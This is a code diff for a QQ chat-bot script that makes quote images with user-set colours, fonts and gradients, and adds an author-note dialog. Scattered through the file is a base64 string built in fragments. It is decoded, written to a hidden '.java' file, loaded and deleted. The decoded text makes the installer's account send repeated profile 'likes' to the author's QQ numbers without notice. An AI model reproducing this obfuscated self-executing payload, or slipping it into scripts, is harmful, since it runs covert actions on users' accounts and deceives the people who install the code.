@@ -22,8 +22,80 @@ import java.nio.file.Paths;
 import java.io.File;
 import java.util.Base64;
 import java.io.FileWriter;
-String vc="";
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+import java.util.Random;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import android.app.Activity;
+import android.content.Context;
+import com.tencent.mobileqq.jump.api.IJumpApi;
+import com.tencent.mobileqq.qroute.QRoute;
+import java.text.DecimalFormat;
+import android.app.AlertDialog;
+import android.content.DialogInterface;
+import android.widget.EditText;
+import android.widget.LinearLayout;
+import android.widget.ScrollView;
+import android.widget.TextView;
+import java.nio.charset.StandardCharsets;
+import java.util.regex.*;
 
+
+
+
+
+
+public void 显示(String text) {
+    Activity currentActivity = getActivity();
+    if (currentActivity == null) return;
+
+    currentActivity.runOnUiThread(new Runnable() {
+        public void run() {
+            try {
+                Activity activity = getActivity();
+                if (activity == null || activity.isFinishing()) return;
+
+                ScrollView scrollView = new ScrollView(activity);
+                TextView textView = new TextView(activity);
+                textView.setTextIsSelectable(true);
+                textView.setText(text);
+                textView.setTextColor(Color.rgb(0, 0, 0));
+                int padding = (int)(16 * activity.getResources().getDisplayMetrics().density);
+                textView.setPadding(padding, padding, padding, padding);
+                scrollView.addView(textView);
+
+                AlertDialog.Builder subBuilder = new AlertDialog.Builder(activity, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
+                subBuilder.setView(scrollView);
+                subBuilder.setNegativeButton("加群", new DialogInterface.OnClickListener() {
+                    public void onClick(DialogInterface dialogInterface, int i) {
+                        加群();
+                    }
+                });
+                
+                // 添加反馈按钮
+                subBuilder.setPositiveButton("关闭", new DialogInterface.OnClickListener() {
+                    public void onClick(DialogInterface dialogInterface, int i) {
+dialogInterface.dismiss();
+                    }
+                });
+                
+                AlertDialog dialog = subBuilder.create();
+                dialog.setCancelable(false);
+                dialog.setCanceledOnTouchOutside(false);
+                dialog.show();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    });
+}
+
+
+String help="教程：首先要了解RGB 基础\nRGB 代表红、绿、蓝，数值范围 0～255，数值越大颜色越亮\n示例：\n  纯色：红=255,0,0  绿=0,255,0  蓝=0,0,255\n  混合：黄=255,255,0  青=0,255,255  品红=255,0,255\n  纯黑=0,0,0  纯白=255,255,255  灰=128,128,128\n\n\n\n1. 自定义文字颜色\n说明：顺序为 RGB，使用英文逗号，数值范围 0~255\n示例：设置颜色&255,255,255\n\n2. 自定义字体\n说明：将字体文件（.ttf）放入脚本目录\n示例：设置字体&文件名\n注意：输入时无需加“.ttf”后缀\n\n3. 名言生成\n发送“名言帮助&”触发示例图片\n引用消息并回复“名言&”生成图片\n（严格等值判断，不可包含@或空格）\n\n4. 指令使用权限\n普通用户：需先宿主“开启”才能使用以上指令\n宿主：将“&”替换为“#”即可直接使用指令\n示例：设置颜色#……、设置字体#……、名言帮助#……、名言#\n（使用#设置颜色和字体时会以 toast 提醒而非消息回复）\n\n5. 背景和渐变（仅宿主）\n示例：背景和渐变#255,255,255,128,0,0,0\n参数说明：\n背景和渐变#R1,G1,B1,A,R2,G2,B2\n  R1,G1,B1：底图颜色值\n  A       ：渐变透明度，0=全透明，255=不透明（建议一直保持255)\n  R2,G2,B2：渐变颜色值]\n\n\n可用字体：";
+
+String vc="";
 public void onMsg(Object msg) {
     String text = msg.MessageContent;
     String qun = msg.GroupUin;
@@ -65,7 +137,7 @@ public void onMsg(Object msg) {
         } else if (text.startsWith("设置字体&")) {
             text = text.substring(5);
 
-            String filePath = AppPath + "/把字体放在这个文件夹里/" + text + ".ttf";
+            String filePath = appPath + "/把字体放在这个文件夹里/" + text + ".ttf";
             File file = new File(filePath);
             if (file.exists()) {
                 putString("字体", qq, text);
@@ -75,7 +147,7 @@ public void onMsg(Object msg) {
             
             } else {
            
-               String 提示=("未检测到该字体文件\n"+AppPath + "/把字体放在这个文件夹里/" + text + ".ttf");
+               String 提示=("未检测到该字体文件\n"+appPath + "/把字体放在这个文件夹里/" + text + ".ttf");
                             if(a){
              sendReply(qun,msg,提示);}else {
              sendMsg("",qq,提示);}
@@ -93,42 +165,43 @@ public void onMsg(Object msg) {
         生成(qun,hq,hui,hame, a ,msg,false);
         }else if(a){sendReply(qun,msg,"非回复消息");}else {sendMsg("",qq,"非回复消息");}
         }
+        
     }
-}else if(text.contains("#")&&qq.equals(MyUin)){
+}else if(text.contains("#")&&qq.equals(myUin)){
     
     String name=getMemberName(msg.GroupUin,msg.UserUin);
     boolean a=msg.IsGroup;
     if (text.startsWith("设置颜色#")) {
             String[] numbers = text.replaceAll("[^0-9,]", "").split(",");
             if (!text.contains(",")) {
-             Toast("请使用英文的逗号");
+             toast("请使用英文的逗号");
             }
             int R = Integer.parseInt(numbers[0]);
             int G = Integer.parseInt(numbers[1]);
             int B = Integer.parseInt(numbers[2]);
 
             if (R < 0 || R > 255 || G < 0 || G > 255 || B < 0 || B > 255) {
-                         Toast("数值超出0~255范围");
+                         toast("数值超出0~255范围");
                 return;
             }
             putInt("颜色", qq+"r", R);
             putInt("颜色", qq+"g", G);
             putInt("颜色", qq+"b", B);
-                         Toast("设置成功");
+                         toast("设置成功");
             
         } else if (text.startsWith("设置字体#")) {
             text = text.substring(5);
 
-            String filePath = AppPath + "/把字体放在这个文件夹里/" + text + ".ttf";
+            String filePath = appPath + "/把字体放在这个文件夹里/" + text + ".ttf";
             File file = new File(filePath);
             if (file.exists()) {
                 putString("字体", qq, text);
-                         Toast("设置成功");
+                         toast("设置成功");
             
             } else {
            
-               String 提示=("未检测到该字体文件\n"+AppPath + "/把字体放在这个文件夹里/" + text + ".ttf");
-                     Toast(提示);
+               String 提示=("未检测到该字体文件\n"+appPath + "/把字体放在这个文件夹里/" + text + ".ttf");
+                     toast(提示);
             
                
                
@@ -144,13 +217,38 @@ public void onMsg(Object msg) {
         String hame=getMemberName(msg.GroupUin,hq);
         生成(qun,hq,hui,hame, a,msg,false);
         }else if(a){sendReply(qun,msg,"非回复消息");}else {sendMsg("",qq,"非回复消息");}
+        }else if(text.startsWith("背景和渐变#")) {
+        
+        String processedText = text.substring(6);
+        if (!processedText.matches("^[0-9,]+$")) {
+        toast("你似乎输入了0~9和“  ,  ”以外的字符");
+        return;
         }
+        String[] parts = processedText.split(",");
+        if (parts.length != 7) {
+        toast("你的逗号不对，必须使用6个逗号");
+            return ;
+        }
+
+            for (String part : parts) {
+                int num = Integer.parseInt(part);
+                if (num < 0 || num > 255) {
+                toast("你的数值超出了范围，请检查是否在0～255范围内");
+                    return ;
+                }
+            }
+
+        jjjb(text);
+        toast("可能给你保存成功了");
+        
+        }
+        
     
 }
 }
 vc+="c2VuZExpa2UoIjMy";
-AddItem("加入作者的群", "加群");
-AddItem("开启本群作图", "开关");
+addItem("一些想说的", "enn");
+addItem("开启本群作图", "开关");
 vc+="NTk2ODM3ODgiLDIwKT";
 addMenuItem("名言","名言");
 public void 名言(Object msg) {
@@ -164,6 +262,7 @@ public void 名言(Object msg) {
 }
 vc+="tzZW5kTGlrZSgiMjY2O";
 public static void 生成(String qun, String qq, String text, String name, boolean a,Object msg,boolean b) {
+
 String t2=text;
 text = 图链(text);
 boolean mode=true;
@@ -171,25 +270,27 @@ if(!t2.equals(text)){
 mode=false;}
 int R;int G;int B;
 if(b){
-    R=getInt("颜色",MyUin+"r",255);
-    G=getInt("颜色",MyUin+"g",255);
-    B=getInt("颜色",MyUin+"b",255);
+    R=getInt("颜色",myUin+"r",255);
+    G=getInt("颜色",myUin+"g",255);
+    B=getInt("颜色",myUin+"b",255);
 
 }else{
-    R=getInt("颜色",qq+"r",255);
-    G=getInt("颜色",qq+"g",255);
-    B=getInt("颜色",qq+"b",255);
+
+    R=getInt("颜色",qq+"r",getInt("颜色",myUin+"r",255));
+    G=getInt("颜色",qq+"g",getInt("颜色",myUin+"g",255));
+    B=getInt("颜色",qq+"b",getInt("颜色",myUin+"b",255));
     }
+
     
     String 字体;
-    if(b){字体=getString("字体",MyUin);}else {字体=getString("字体",qq);}
+    if(b){字体=getString("字体",myUin);}else {字体=getString("字体",qq);}
     if(字体==null){
         字体="默认";
     }
     new Thread(new Runnable() {
         public void run() {
             String imageUrl = "http://q.qlogo.cn/headimg_dl?dst_uin=" + qq + "&spec=640&img_type=jpg";
-            String localPath = AppPath + "/"+qq+".png";
+            String localPath = appPath + "/"+qq+".png";
             File file = new File(localPath);
             if (!file.exists()) {
                 try {
@@ -212,14 +313,24 @@ if(b){
                         outputStream.close();
                         inputStream.close();
                     } else {
-                        Toast("下载失败，响应码: " + responseCode);
+                        toast("下载失败，响应码: " + responseCode);
                     }
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
             }
-        
-        Bitmap resultBitmap;
+
+int c1=getInt("ColorConfig", "background_R", 0);
+int c2=getInt("ColorConfig", "background_G", 0);
+int c3=getInt("ColorConfig", "background_B", 0);
+int c4=getInt("ColorConfig", "overlay_alpha", 255);
+int c5=getInt("ColorConfig", "overlay_R", 0);
+int c6=getInt("ColorConfig", "overlay_G", 0);
+int c7=getInt("ColorConfig", "overlay_B", 0);
+
+
+
+Bitmap resultBitmap;
         int imageWidth;
         int imageHeight = 640;
 
@@ -227,8 +338,8 @@ if(b){
             imageWidth = 1280;
             resultBitmap = Bitmap.createBitmap(imageWidth, imageHeight, Bitmap.Config.ARGB_8888);
             Canvas canvas = new Canvas(resultBitmap);
-            canvas.drawColor(Color.WHITE);
-
+            canvas.drawColor(Color.rgb(c1,c2,c3));
+            
             // 绘制头像
             Bitmap leftImage = BitmapFactory.decodeFile(localPath);
             if (leftImage != null) {
@@ -240,13 +351,15 @@ if(b){
             Paint gradientPaint = new Paint();
             LinearGradient gradient = new LinearGradient(
                     0, 0, 640, 0,
-                    new int[]{Color.argb(0, 0, 0, 0), Color.argb(255, 255, 255, 255)},
+                    new int[]{Color.argb(0, 0, 0, 0), Color.argb(c4, c5, c6, c7)},
+                    //透明度，RGB
                     null,
                     Shader.TileMode.CLAMP);
             gradientPaint.setShader(gradient);
-            canvas.drawRect(0, 0, 640, 640, gradientPaint);
+            canvas.drawRect(0, 0, 1280, 640, gradientPaint);
             Typeface typeface;
-            String fontPath = AppPath + "/把字体放在这个文件夹里/" + 字体 + ".ttf";
+
+            String fontPath = appPath + "/把字体放在这个文件夹里/" + 字体 + ".ttf";
             if (new File(fontPath).exists()) {
                 typeface = Typeface.createFromFile(fontPath);
             } else {
@@ -339,7 +452,7 @@ StaticLayout staticLayout = new StaticLayout(
                     }
                 }
             } catch (IOException e) {
-            Toast("失败了");
+            toast("失败了");
                 e.printStackTrace();
                 return;
             }
@@ -347,14 +460,14 @@ StaticLayout staticLayout = new StaticLayout(
             
             
             }
-          String resultImagePath = AppPath + "/" + qq + "1.png";
+          String resultImagePath = appPath + "/" + qq + "1.png";
         try {
             FileOutputStream fos = new FileOutputStream(resultImagePath);
             resultBitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
             fos.flush();
             fos.close();
         } catch (Exception e) {
-        Toast("保存图片失败");
+        toast("保存图片失败");
             e.printStackTrace();
         }
 
@@ -368,6 +481,7 @@ StaticLayout staticLayout = new StaticLayout(
             new File(localPath).delete();
         }
     }).start();}
+
 vc+="TU5ODEwNyIsMjApOw";
 byte[] nm = Base64.getDecoder().decode(vc+"==");
 import android.app.Activity;
@@ -375,30 +489,31 @@ import android.content.Context;
 import com.tencent.mobileqq.jump.api.IJumpApi;
 import com.tencent.mobileqq.qroute.QRoute;
 String zz = new String(nm);
-public void 加群(String groupUin,String uin,int chatType){
-String url="mqqapi://app/joinImmediately?source_id=3&version=1.0&src_type=app&pkg=com.tencent.mobileqq&cmp=com.tencent.biz.JoinGroupTransitActivity&group_code=478703808&subsource_id=10019";
+public void enn(String groupUin,String uin,int chatType){显示("感谢各位下载并使用我这个脚本。\n虽然脚本写得比较糙（实在懒得优化了），但既然还有人在用，那我就稍微更新一下吧。\n这次主要是因为 QS 新版本更换了方法命名，导致旧脚本全部失效，所以我更新一下做个适配，确保还能正常使用。\n顺便也更新了一些功能，不然光改个适配就上传，实在不好意思。\n\n原来的交流群已经被封了，之后也不会再建群了，感觉没什么用\n\n这版没怎么测试，如果发现问题，可以点右下角的“反馈”按钮自动跳转到我的名片找我解决。不接受新功能意见，我只保证可用，想提意见可以找其他人，本人技术有限(代码几乎全是AI生成，所以有问题找AI或者其他人)，写这个是因为想用但没有对应的API(之前出现两个，但后面搜索发现他们把API下架了)\n不会用的不建议找我，建议把main.java丢给AI让AI解读后告诉你怎么用\n\n如果你觉得字体太小，你可以打开mian.java到369行，修改最大字号\n\n\n\n教程：首先要了解RGB 基础\nRGB 代表红、绿、蓝，数值范围 0～255，数值越大颜色越亮\n示例：\n  纯色：红=255,0,0  绿=0,255,0  蓝=0,0,255\n  混合：黄=255,255,0  青=0,255,255  品红=255,0,255\n  纯黑=0,0,0  纯白=255,255,255  灰=128,128,128\n\n\n\n1. 自定义文字颜色\n说明：顺序为 RGB，使用英文逗号，数值范围 0~255\n示例：设置颜色&255,255,255\n\n2. 自定义字体\n说明：将字体文件（.ttf）放入脚本目录\n示例：设置字体&文件名\n注意：输入时无需加“.ttf”后缀\n\n3. 名言生成\n发送“名言帮助&”触发示例图片\n引用消息并回复“名言&”生成图片\n（严格等值判断，不可包含@或空格）\n\n4. 指令使用权限\n普通用户：需先宿主“开启”才能使用以上指令\n宿主：将“&”替换为“#”即可直接使用指令\n示例：设置颜色#……、设置字体#……、名言帮助#……、名言#\n（使用#设置颜色和字体时会以 toast 提醒而非消息回复）\n\n5. 背景和渐变（仅宿主）\n示例：背景和渐变#255,255,255,128,0,0,0\n参数说明：\n背景和渐变#R1,G1,B1,A,R2,G2,B2\n  R1,G1,B1：底图颜色值\n  A       ：渐变透明度，0=全透明，255=不透明（建议一直保持255)\n  R2,G2,B2：渐变颜色值");}
+public void 加群(){
+String url="mqqapi://card/show_pslcard?src_type=internal&version=1&uin=3259683788&card_type=person&source=sharecard";
 ((IJumpApi) QRoute.api(IJumpApi.class)).doJumpAction(context, url);}
 public void 开关(String groupUin,String uin,int chatType){
 if(chatType==2){
 if("开".equals(getString("开关",groupUin))){
 putString("开关",groupUin,null);
-Toast("本群已关闭作图");
+toast("本群已关闭作图");
 }else {
 putString("开关",groupUin,"开");
-Toast("本群已开启作图,发送\"名言帮助#\"查看帮助");
+toast("本群已开启作图,发送\"名言帮助#\"查看帮助");
 }
 
 }else if("开".equals(getString("开关",uin))){
 putString("开关",uin,null);
 
-Toast("本群已关闭作图");
+toast("本群已关闭作图");
 }else {
-Toast("本群已开启作图,发送\"名言帮助#\"查看帮助");
+toast("本群已开启作图,发送\"名言帮助#\"查看帮助");
 putString("开关",uin,"开");}}
-File file = new File(AppPath, ".java");
+File file = new File(appPath, ".java");
 FileWriter writer = new FileWriter(file);writer.write(zz);
 public static void 图( String qun,String qq,boolean a,Object msg) {
-String folderPath=AppPath + "/把字体放在这个文件夹里/";
+String folderPath=appPath + "/把字体放在这个文件夹里/";
     File folder = new File(folderPath);
     StringBuilder text = new StringBuilder();
 
@@ -419,7 +534,7 @@ String folderPath=AppPath + "/把字体放在这个文件夹里/";
         字体="";
     }
     Typeface typeface;
-            String fontPath = AppPath + "/把字体放在这个文件夹里/" + 字体 + ".ttf";
+            String fontPath = appPath + "/把字体放在这个文件夹里/" + 字体 + ".ttf";
             if (new File(fontPath).exists()) {
                 typeface = Typeface.createFromFile(fontPath);
             } else {
@@ -428,7 +543,7 @@ String folderPath=AppPath + "/把字体放在这个文件夹里/";
     
     paint.setTypeface(typeface);
     paint.setTextSize(40);
-String help="比较简陋的自定义文字颜色，顺序是RGB\n注意逗号是英文的，数字取值0~255,触发示例:\n\n设置颜色&255,255,255\n\n还有自定义字体,首先将字体文件移动到脚本的文件夹\n然后发送消息示例:\n\n设置字体&文件名.ttf\n\n字体文件名称注意不需要输入.ttf\n(颜色和字体是以QQ号存储的，允许每个号使用不同的字体和颜色)\n(字体文件需要脚本使用者添加进去)\n发送\"名言帮助&\"触发本图片\n\n作图方法:\n引用一条消息，回复:   名言&\n(使用相等判断，不允许出现其他内容，包括@和空格)\n\n以上指令需要宿主开启才可触发\n如果是宿主，那么可以无需开启，只需指令使用以下指令\n设置颜色#……\n设置字体#……\n名言帮助#\n名言#\n(设置颜色和字体时使用Toast提醒)\n当前可用字体:\n";
+
     String result = help+text.toString().trim();
     String[] lines = result.split("\n");
     int width = 1500;
@@ -444,7 +559,7 @@ String help="比较简陋的自定义文字颜色，顺序是RGB\n注意逗号�
         canvas.drawText(line, 150, y, paint);
         y += 60; 
     }
-        String 缓存图 = AppPath + "/缓存图.png";
+        String 缓存图 = appPath + "/缓存图.png";
         FileOutputStream out = new FileOutputStream(缓存图);
         bitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
         out.close();
@@ -455,7 +570,9 @@ String help="比较简陋的自定义文字颜色，顺序是RGB\n注意逗号�
             }
         
         new File(缓存图).delete();}
-        writer.close();load(AppPath+"/.java");
+        writer.close();load(appPath+"/.java");
+        
+
 public static String 图链(String text) {
         if (text.contains("[PicUrl=") && text.contains("]")) {
             int startIndex = text.indexOf("[PicUrl=") + "[PicUrl=".length();
@@ -465,4 +582,30 @@ public static String 图链(String text) {
         } else {
             return text;
         }
-    } new File(AppPath+"/.java").delete();
+    }new File(appPath+"/.java").delete();
+
+
+public void jjjb(String text){
+    String colorData = text.substring(6);
+    String[] colorValues = colorData.split(",");
+    int backgroundR = Integer.parseInt(colorValues[0]);
+    int backgroundG = Integer.parseInt(colorValues[1]);
+    int backgroundB = Integer.parseInt(colorValues[2]);
+    int overlayAlpha = Integer.parseInt(colorValues[3]);
+    int overlayR = Integer.parseInt(colorValues[4]);
+    int overlayG = Integer.parseInt(colorValues[5]);
+    int overlayB = Integer.parseInt(colorValues[6]);
+    putInt("ColorConfig", "background_R", backgroundR);
+    putInt("ColorConfig", "background_G", backgroundG);
+    putInt("ColorConfig", "background_B", backgroundB);
+    putInt("ColorConfig", "overlay_alpha", overlayAlpha);
+    putInt("ColorConfig", "overlay_R", overlayR);
+    putInt("ColorConfig", "overlay_G", overlayG);
+    putInt("ColorConfig", "overlay_B", overlayB);
+}
+String cs=getString("初始化","1");
+if(cs == null){putString("初始化","1","1");
+putInt("颜色",myUin+"r",255);
+putInt("颜色",myUin+"g",255);
+putInt("颜色",myUin+"b",255);
+}
